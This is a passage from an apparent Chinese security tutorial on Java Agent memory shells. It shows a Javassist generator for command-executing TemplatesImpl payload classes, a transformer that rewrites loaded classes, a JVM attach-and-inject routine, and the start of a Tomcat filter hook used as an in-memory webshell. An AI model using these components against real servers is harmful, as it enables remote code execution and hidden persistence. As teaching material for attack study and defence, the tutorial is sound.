+</span></span></code></pre></div><p>由此延展的攻击面其实是我们可以利用 Javassist 生成一个恶意的<code>.class</code>类，其实在 CC 链的时候也是可以这样打的。</p><h5 id=使用-javassist-生成恶意-class>使用 Javassist 生成恶意 class
+<a class=anchor href=#%e4%bd%bf%e7%94%a8-javassist-%e7%94%9f%e6%88%90%e6%81%b6%e6%84%8f-class>#</a></h5><p>我们使用<code>TemplatesImpl</code>利用链的恶意类来构造：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.io.IOException;
+</span></span><span style=display:flex><span> 
+</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>shell</span> <span style=color:#66d9ef>extends</span> AbstractTranslet {
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>transform</span>(DOM document, SerializationHandler<span style=color:#f92672>[]</span> handlers) <span style=color:#66d9ef>throws</span> TransletException {
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span> 
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>transform</span>(DOM document, DTMAxisIterator iterator, SerializationHandler handler) <span style=color:#66d9ef>throws</span> TransletException {
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span> 
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#a6e22e>shell</span>() <span style=color:#66d9ef>throws</span> IOException {
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>try</span> {
+</span></span><span style=display:flex><span>            Runtime.<span style=color:#a6e22e>getRuntime</span>().<span style=color:#a6e22e>exec</span>(<span style=color:#e6db74>&#34;calc&#34;</span>);
+</span></span><span style=display:flex><span>        } <span style=color:#66d9ef>catch</span> (Exception var2) {
+</span></span><span style=display:flex><span>            var2.<span style=color:#a6e22e>printStackTrace</span>();
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>但是恶意类在执行过程中并没有用到重写的方法，所以我们可以直接使用 Javassist 从字节码层面来生成恶意 class，跳过恶意类的编译过程：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>package</span> javassist;  
+</span></span><span style=display:flex><span>  
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.io.File;  
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.io.FileOutputStream;  
+</span></span><span style=display:flex><span>  
+</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>EvilPayload</span> {  
+</span></span><span style=display:flex><span>  
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>byte</span><span style=color:#f92672>[]</span> <span style=color:#a6e22e>getTemplatesImpl</span>(String cmd) {  
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>try</span> {  
+</span></span><span style=display:flex><span>            ClassPool pool <span style=color:#f92672>=</span> ClassPool.<span style=color:#a6e22e>getDefault</span>();  
+</span></span><span style=display:flex><span>            CtClass ctClass <span style=color:#f92672>=</span> pool.<span style=color:#a6e22e>makeClass</span>(<span style=color:#e6db74>&#34;Evil&#34;</span>);  
+</span></span><span style=display:flex><span>            CtClass superClass <span style=color:#f92672>=</span> pool.<span style=color:#a6e22e>get</span>(<span style=color:#e6db74>&#34;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&#34;</span>);  
+</span></span><span style=display:flex><span>            ctClass.<span style=color:#a6e22e>setSuperclass</span>(superClass);  
+</span></span><span style=display:flex><span>            CtConstructor constructor <span style=color:#f92672>=</span> ctClass.<span style=color:#a6e22e>makeClassInitializer</span>();  
+</span></span><span style=display:flex><span>            constructor.<span style=color:#a6e22e>setBody</span>(<span style=color:#e6db74>&#34; try {\n&#34;</span> <span style=color:#f92672>+</span>  
+</span></span><span style=display:flex><span>                    <span style=color:#e6db74>&#34; Runtime.getRuntime().exec(\&#34;&#34;</span> <span style=color:#f92672>+</span> cmd <span style=color:#f92672>+</span>  
+</span></span><span style=display:flex><span>                    <span style=color:#e6db74>&#34;\&#34;);\n&#34;</span> <span style=color:#f92672>+</span>  
+</span></span><span style=display:flex><span>                    <span style=color:#e6db74>&#34; } catch (Exception ignored) {\n&#34;</span> <span style=color:#f92672>+</span>  
+</span></span><span style=display:flex><span>                    <span style=color:#e6db74>&#34; }&#34;</span>);  
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>byte</span><span style=color:#f92672>[]</span> bytes <span style=color:#f92672>=</span> ctClass.<span style=color:#a6e22e>toBytecode</span>();  
+</span></span><span style=display:flex><span>            ctClass.<span style=color:#a6e22e>defrost</span>();  
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> bytes;  
+</span></span><span style=display:flex><span>        } <span style=color:#66d9ef>catch</span> (Exception e) {  
+</span></span><span style=display:flex><span>            e.<span style=color:#a6e22e>printStackTrace</span>();  
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>new</span> <span style=color:#66d9ef>byte</span><span style=color:#f92672>[]</span>{};  
+</span></span><span style=display:flex><span>        }  
+</span></span><span style=display:flex><span>    }  
+</span></span><span style=display:flex><span>  
+</span></span><span style=display:flex><span>  
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>writeShell</span>() <span style=color:#66d9ef>throws</span> Exception {  
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>byte</span><span style=color:#f92672>[]</span> shell <span style=color:#f92672>=</span> EvilPayload.<span style=color:#a6e22e>getTemplatesImpl</span>(<span style=color:#e6db74>&#34;Calc&#34;</span>);  
+</span></span><span style=display:flex><span>        FileOutputStream fileOutputStream <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> FileOutputStream(<span style=color:#66d9ef>new</span> File(<span style=color:#e6db74>&#34;S&#34;</span>));  
+</span></span><span style=display:flex><span>        fileOutputStream.<span style=color:#a6e22e>write</span>(shell);  
+</span></span><span style=display:flex><span>    }  
+</span></span><span style=display:flex><span>  
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>main</span>(String<span style=color:#f92672>[]</span> args) <span style=color:#66d9ef>throws</span> Exception {  
+</span></span><span style=display:flex><span>        writeShell();  
+</span></span><span style=display:flex><span>    }  
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>生成的恶意文件被输出到<code>S</code>这个文件中，反编译出来的代码：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#75715e>//  </span>
+</span></span><span style=display:flex><span><span style=color:#75715e>// Source code recreated from a .class file by IntelliJ IDEA  </span>
+</span></span><span style=display:flex><span><span style=color:#75715e>// (powered by FernFlower decompiler)  </span>
+</span></span><span style=display:flex><span><span style=color:#75715e>//  </span>
+</span></span><span style=display:flex><span>  
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;  
+</span></span><span style=display:flex><span>  
+</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>Evil</span> <span style=color:#66d9ef>extends</span> AbstractTranslet {  
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>static</span> {  
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>try</span> {  
+</span></span><span style=display:flex><span>            Runtime.<span style=color:#a6e22e>getRuntime</span>().<span style=color:#a6e22e>exec</span>(<span style=color:#e6db74>&#34;Calc&#34;</span>);  
+</span></span><span style=display:flex><span>        } <span style=color:#66d9ef>catch</span> (Exception var1) {  
+</span></span><span style=display:flex><span>        }  
+</span></span><span style=display:flex><span>  
+</span></span><span style=display:flex><span>    }  
+</span></span><span style=display:flex><span>  
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#a6e22e>Evil</span>() {  
+</span></span><span style=display:flex><span>    }  
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><h4 id=instrumentation>Instrumentation
+<a class=anchor href=#instrumentation>#</a></h4><p><code>Instrumentation</code>是 JVMTI Agent（JVM Tool Interface Agent）的一部分，Java Agent 通过这个类和目标 JVM 进行交互，从而达到修改数据的效果。</p><p>它在 Java 中是一个接口，常用方法如下：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>interface</span> <span style=color:#a6e22e>Instrumentation</span> {
+</span></span><span style=display:flex><span>    
+</span></span><span style=display:flex><span>    <span style=color:#75715e>//增加一个Class 文件的转换器，转换器用于改变 Class 二进制流的数据，参数 canRetransform 设置是否允许重新转换。</span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>addTransformer</span>(ClassFileTransformer transformer, <span style=color:#66d9ef>boolean</span> canRetransform);
+</span></span><span style=display:flex><span> 
+</span></span><span style=display:flex><span>    <span style=color:#75715e>//在类加载之前，重新定义 Class 文件，ClassDefinition 表示对一个类新的定义，如果在类加载之后，需要使用 retransformClasses 方法重新定义。addTransformer方法配置之后，后续的类加载都会被Transformer拦截。对于已经加载过的类，可以执行retransformClasses来重新触发这个Transformer的拦截。类加载的字节码被修改后，除非再次被retransform，否则不会恢复。</span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>addTransformer</span>(ClassFileTransformer transformer);
+</span></span><span style=display:flex><span> 
+</span></span><span style=display:flex><span>    <span style=color:#75715e>//删除一个类转换器</span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>boolean</span> <span style=color:#a6e22e>removeTransformer</span>(ClassFileTransformer transformer);
+</span></span><span style=display:flex><span> 
+</span></span><span style=display:flex><span> 
+</span></span><span style=display:flex><span>    <span style=color:#75715e>//在类加载之后，重新定义 Class。这个很重要，该方法是1.6 之后加入的，事实上，该方法是 update 了一个类。</span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>retransformClasses</span>(Class<span style=color:#f92672>&lt;?&gt;</span>... classes) <span style=color:#66d9ef>throws</span> UnmodifiableClassException;
+</span></span><span style=display:flex><span> 
+</span></span><span style=display:flex><span> 
+</span></span><span style=display:flex><span> 
+</span></span><span style=display:flex><span>    <span style=color:#75715e>//判断一个类是否被修改</span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>boolean</span> <span style=color:#a6e22e>isModifiableClass</span>(Class<span style=color:#f92672>&lt;?&gt;</span> theClass);
+</span></span><span style=display:flex><span> 
+</span></span><span style=display:flex><span>    <span style=color:#75715e>// 获取目标已经加载的类。</span>
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>@SuppressWarnings</span>(<span style=color:#e6db74>&#34;rawtypes&#34;</span>)
+</span></span><span style=display:flex><span>    Class<span style=color:#f92672>[]</span> <span style=color:#a6e22e>getAllLoadedClasses</span>();
+</span></span><span style=display:flex><span> 
+</span></span><span style=display:flex><span>    <span style=color:#75715e>//获取一个对象的大小</span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>long</span> <span style=color:#a6e22e>getObjectSize</span>(Object objectToSize);
+</span></span><span style=display:flex><span> 
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><h5 id=classfiletransformer>ClassFileTransformer
+<a class=anchor href=#classfiletransformer>#</a></h5><p>转换类文件，该接口下之后一个方法：<code>transform()</code>，重写该方法即可转换任意类文件，并返回新的被取代的类文件，在 Java Agent 内存马中便是在该方法下重写恶意代码，从而修改原有类文件代码逻辑，与<code>addtransformer()</code>搭配使用。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#75715e>//增加一个Class 文件的转换器，转换器用于改变 Class 二进制流的数据，参数 canRetransform 设置是否允许重新转换。  </span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>addTransformer</span>(ClassFileTransformer transformer, <span style=color:#66d9ef>boolean</span> canRetransform);
+</span></span></code></pre></div><h5 id=获取目标-jvm-已加载类>获取目标 JVM 已加载类
+<a class=anchor href=#%e8%8e%b7%e5%8f%96%e7%9b%ae%e6%a0%87-jvm-%e5%b7%b2%e5%8a%a0%e8%bd%bd%e7%b1%bb>#</a></h5><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>Sleep_Hello</span> {  
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>main</span>(String<span style=color:#f92672>[]</span> args) <span style=color:#66d9ef>throws</span> InterruptedException {  
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>while</span>(<span style=color:#66d9ef>true</span>) {  
+</span></span><span style=display:flex><span>            hello();  
+</span></span><span style=display:flex><span>            sleep(3000);  
+</span></span><span style=display:flex><span>        }  
+</span></span><span style=display:flex><span>    }  
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>hello</span>(){  
+</span></span><span style=display:flex><span>        System.<span style=color:#a6e22e>out</span>.<span style=color:#a6e22e>println</span>(<span style=color:#e6db74>&#34;Hello World!&#34;</span>);  
+</span></span><span style=display:flex><span>    }  
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>Agent 主类：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>agentmain_transform</span> {  
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>agentmain</span>(String args, Instrumentation inst) <span style=color:#66d9ef>throws</span> InterruptedException, UnmodifiableClassException {  
+</span></span><span style=display:flex><span>        Class <span style=color:#f92672>[]</span> classes <span style=color:#f92672>=</span> inst.<span style=color:#a6e22e>getAllLoadedClasses</span>();  
+</span></span><span style=display:flex><span>  
+</span></span><span style=display:flex><span>        <span style=color:#75715e>//获取目标JVM加载的全部类  </span>
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>for</span>(Class cls : classes){  
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> (cls.<span style=color:#a6e22e>getName</span>().<span style=color:#a6e22e>equals</span>(<span style=color:#e6db74>&#34;AgentShell.Sleep_Hello&#34;</span>)){  
+</span></span><span style=display:flex><span>  
+</span></span><span style=display:flex><span>                <span style=color:#75715e>//添加一个transformer到Instrumentation，并重新触发目标类加载  </span>
+</span></span><span style=display:flex><span>                inst.<span style=color:#a6e22e>addTransformer</span>(<span style=color:#66d9ef>new</span> Hello_Transform(),<span style=color:#66d9ef>true</span>);  
+</span></span><span style=display:flex><span>                inst.<span style=color:#a6e22e>retransformClasses</span>(cls);  
+</span></span><span style=display:flex><span>            }  
+</span></span><span style=display:flex><span>        }  
+</span></span><span style=display:flex><span>    }  
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>Transformer 修改类：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>Hello_Transform</span> <span style=color:#66d9ef>implements</span> ClassFileTransformer {  
+</span></span><span style=display:flex><span>  
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>@Override</span>  
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>byte</span><span style=color:#f92672>[]</span> <span style=color:#a6e22e>transform</span>(ClassLoader loader, String className, Class<span style=color:#f92672>&lt;?&gt;</span> classBeingRedefined, ProtectionDomain protectionDomain, <span style=color:#66d9ef>byte</span><span style=color:#f92672>[]</span> classfileBuffer) <span style=color:#66d9ef>throws</span> IllegalClassFormatException {  
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>try</span> {  
+</span></span><span style=display:flex><span>  
+</span></span><span style=display:flex><span>            <span style=color:#75715e>//获取CtClass 对象的容器 ClassPool            </span>
+</span></span><span style=display:flex><span>            ClassPool classPool <span style=color:#f92672>=</span> ClassPool.<span style=color:#a6e22e>getDefault</span>();  
+</span></span><span style=display:flex><span>  
+</span></span><span style=display:flex><span>            <span style=color:#75715e>//添加额外的类搜索路径  </span>
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> (classBeingRedefined <span style=color:#f92672>!=</span> <span style=color:#66d9ef>null</span>) {  
+</span></span><span style=display:flex><span>                ClassClassPath ccp <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ClassClassPath(classBeingRedefined);  
+</span></span><span style=display:flex><span>                classPool.<span style=color:#a6e22e>insertClassPath</span>(ccp);  
+</span></span><span style=display:flex><span>            }  
+</span></span><span style=display:flex><span>  
+</span></span><span style=display:flex><span>            <span style=color:#75715e>//获取目标类  </span>
+</span></span><span style=display:flex><span>            CtClass ctClass <span style=color:#f92672>=</span> classPool.<span style=color:#a6e22e>get</span>(<span style=color:#e6db74>&#34;AgentShell.Sleep_Hello&#34;</span>);  
+</span></span><span style=display:flex><span>            System.<span style=color:#a6e22e>out</span>.<span style=color:#a6e22e>println</span>(ctClass);  
+</span></span><span style=display:flex><span>  
+</span></span><span style=display:flex><span>            <span style=color:#75715e>//获取目标方法  </span>
+</span></span><span style=display:flex><span>            CtMethod ctMethod <span style=color:#f92672>=</span> ctClass.<span style=color:#a6e22e>getDeclaredMethod</span>(<span style=color:#e6db74>&#34;hello&#34;</span>);  
+</span></span><span style=display:flex><span>  
+</span></span><span style=display:flex><span>            <span style=color:#75715e>//设置方法体  </span>
+</span></span><span style=display:flex><span>            String body <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;{System.out.println(\&#34;Hacker!\&#34;);}&#34;</span>;  
+</span></span><span style=display:flex><span>            ctMethod.<span style=color:#a6e22e>setBody</span>(body);  
+</span></span><span style=display:flex><span>  
+</span></span><span style=display:flex><span>            <span style=color:#75715e>//返回目标类字节码  </span>
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>byte</span><span style=color:#f92672>[]</span> bytes <span style=color:#f92672>=</span> ctClass.<span style=color:#a6e22e>toBytecode</span>();  
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> bytes;  
+</span></span><span style=display:flex><span>  
+</span></span><span style=display:flex><span>        }<span style=color:#66d9ef>catch</span> (Exception e){  
+</span></span><span style=display:flex><span>            e.<span style=color:#a6e22e>printStackTrace</span>();  
+</span></span><span style=display:flex><span>        }  
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>null</span>;  
+</span></span><span style=display:flex><span>    }  
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>完毕之后打包 Java Agent 包，<code>MAINFEST.MF</code>进行修改：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-mf data-lang=mf><span style=display:flex><span><span style=color:#a6e22e>Manifest-Version</span><span style=color:#f92672>:</span> 1.0  
+</span></span><span style=display:flex><span><span style=color:#a6e22e>Agent-Class</span><span style=color:#f92672>:</span> AgentShell.agentmain_transform  
+</span></span><span style=display:flex><span><span style=color:#a6e22e>Can-Redefine-Classes</span><span style=color:#f92672>:</span> true  
+</span></span><span style=display:flex><span><span style=color:#a6e22e>Can-Retransform-Classes</span><span style=color:#f92672>:</span> true
+</span></span></code></pre></div><p>最后是写动态注入 Agent 的注入类：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>Inject_Agent</span> {  
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>main</span>(String<span style=color:#f92672>[]</span> args) <span style=color:#66d9ef>throws</span> IOException, AttachNotSupportedException, AgentLoadException, AgentInitializationException, AttachNotSupportedException, AgentLoadException, AgentInitializationException, AgentLoadException, AgentInitializationException, AttachNotSupportedException, AgentLoadException, AgentInitializationException, AgentLoadException, AgentInitializationException, AgentLoadException, AgentInitializationException {  
+</span></span><span style=display:flex><span>        <span style=color:#75715e>//调用VirtualMachine.list()获取正在运行的JVM列表  </span>
+</span></span><span style=display:flex><span>        List<span style=color:#f92672>&lt;</span>VirtualMachineDescriptor<span style=color:#f92672>&gt;</span> list <span style=color:#f92672>=</span> VirtualMachine.<span style=color:#a6e22e>list</span>();  
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>for</span>(VirtualMachineDescriptor vmd : list){  
+</span></span><span style=display:flex><span>            System.<span style=color:#a6e22e>out</span>.<span style=color:#a6e22e>println</span>(vmd.<span style=color:#a6e22e>displayName</span>());  
+</span></span><span style=display:flex><span>            <span style=color:#75715e>//遍历每一个正在运行的JVM，如果JVM名称为Sleep_Hello则连接该JVM并加载特定Agent  </span>
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span>(vmd.<span style=color:#a6e22e>displayName</span>().<span style=color:#a6e22e>equals</span>(<span style=color:#e6db74>&#34;AgentShell.Sleep_Hello&#34;</span>)){  
+</span></span><span style=display:flex><span>  
+</span></span><span style=display:flex><span>                <span style=color:#75715e>//连接指定JVM  </span>
+</span></span><span style=display:flex><span>                VirtualMachine virtualMachine <span style=color:#f92672>=</span> VirtualMachine.<span style=color:#a6e22e>attach</span>(vmd.<span style=color:#a6e22e>id</span>());  
+</span></span><span style=display:flex><span>                <span style=color:#75715e>//加载Agent  </span>
+</span></span><span style=display:flex><span>                virtualMachine.<span style=color:#a6e22e>loadAgent</span>(<span style=color:#e6db74>&#34;E:\\Coding\\Java\\Java-Agent-Memshell\\Instrumentation\\target\\Instrumentation-1.0-SNAPSHOT-jar-with-dependencies.jar&#34;</span>);  
+</span></span><span style=display:flex><span>                <span style=color:#75715e>//断开JVM连接  </span>
+</span></span><span style=display:flex><span>                virtualMachine.<span style=color:#a6e22e>detach</span>();  
+</span></span><span style=display:flex><span>            }  
+</span></span><span style=display:flex><span>  
+</span></span><span style=display:flex><span>        }  
+</span></span><span style=display:flex><span>    }  
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><h3 id=instrumentation-的局限性>Instrumentation 的局限性
+<a class=anchor href=#instrumentation-%e7%9a%84%e5%b1%80%e9%99%90%e6%80%a7>#</a></h3><p>大多数情况下，我们使用<code>Instrumentation</code>都是使用其字节码插桩的功能，简单来说就是类重定义功能，但是有局限性：</p><ul><li><code>premain</code>和<code>agentmain</code>两种方法修改字节码的时机都是类文件加载之后，也就是说必须带有 Class 类型的参数，不能通过字节码文件和自定义类名重新定义一个本来不存在的类。</li><li>类的字节码修改称为类转换（Class Transform），类转换其实最终都回归到类重定义<code>Instrumentation#redefineClasses</code>方法，这个方法有一下限制：<ul><li>新类和老类的父类必须相同</li><li>新类和老类实现的接口也要相同</li><li>新类和老类访问符必须一致，字段数和字段名要一致</li><li>新类和老类新增或删除的方法必须是<code>private static/final</code>修饰的</li><li>可以修改方法体</li></ul></li></ul><h2 id=agent-内存马>Agent 内存马
+<a class=anchor href=#agent-%e5%86%85%e5%ad%98%e9%a9%ac>#</a></h2><p>比如我们起一个 Springboot 的服务，由于 Tomcat 的责任链机制，会按照责任链机制反复调用<code>ApplicationFilterChain#doFilter()</code>方法：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>doFilter</span>(ServletRequest request, ServletResponse response)
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>throws</span> IOException, ServletException {
+</span></span><span style=display:flex><span> 
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span>( Globals.<span style=color:#a6e22e>IS_SECURITY_ENABLED</span> ) {
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>final</span> ServletRequest req <span style=color:#f92672>=</span> request;
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>final</span> ServletResponse res <span style=color:#f92672>=</span> response;
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>try</span> {
+</span></span><span style=display:flex><span>                java.<span style=color:#a6e22e>security</span>.<span style=color:#a6e22e>AccessController</span>.<span style=color:#a6e22e>doPrivileged</span>(
+</span></span><span style=display:flex><span>                        (java.<span style=color:#a6e22e>security</span>.<span style=color:#a6e22e>PrivilegedExceptionAction</span><span style=color:#f92672>&lt;</span>Void<span style=color:#f92672>&gt;</span>) () <span style=color:#f92672>-&gt;</span> {
+</span></span><span style=display:flex><span>                            internalDoFilter(req,res);
+</span></span><span style=display:flex><span>                            <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>null</span>;
+</span></span><span style=display:flex><span>                        }
+</span></span><span style=display:flex><span>                );
+</span></span><span style=display:flex><span>            } ...
+</span></span><span style=display:flex><span>            }
+</span></span><span style=display:flex><span>        } <span style=color:#66d9ef>else</span> {
+</span></span><span style=display:flex><span>            internalDoFilter(request,response);
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>    }
+</span></span></code></pre></div><p>跟进到<code>internalDoFilter()</code>方法中：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#66d9ef>private</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>internalDoFilter</span>(ServletRequest request,
+</span></span><span style=display:flex><span>                                  ServletResponse response)
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>throws</span> IOException, ServletException {
+</span></span><span style=display:flex><span> 
+</span></span><span style=display:flex><span>        <span style=color:#75715e>// Call the next filter if there is one</span>
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (pos <span style=color:#f92672>&lt;</span> n) {
+</span></span><span style=display:flex><span>            ...
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>这两个方法都有<code>ServletRequest</code>和<code>ServletResponse</code>，且 Hook 不会影响正常的业务逻辑，因此很适合作为内存马的回显。</p><h3 id=java-agent-实现-spring-filter-内存马>Java Agent 实现 Spring Filter 内存马
+<a class=anchor href=#java-agent-%e5%ae%9e%e7%8e%b0-spring-filter-%e5%86%85%e5%ad%98%e9%a9%ac>#</a></h3><p>复用上面的<code>agentmain</code>，修改字节码的关键在于<code>transform()</code>方法，因此我们重写该方法即可：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>Filter_Transform</span> <span style=color:#66d9ef>implements</span> ClassFileTransformer {  
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>@Override</span>  
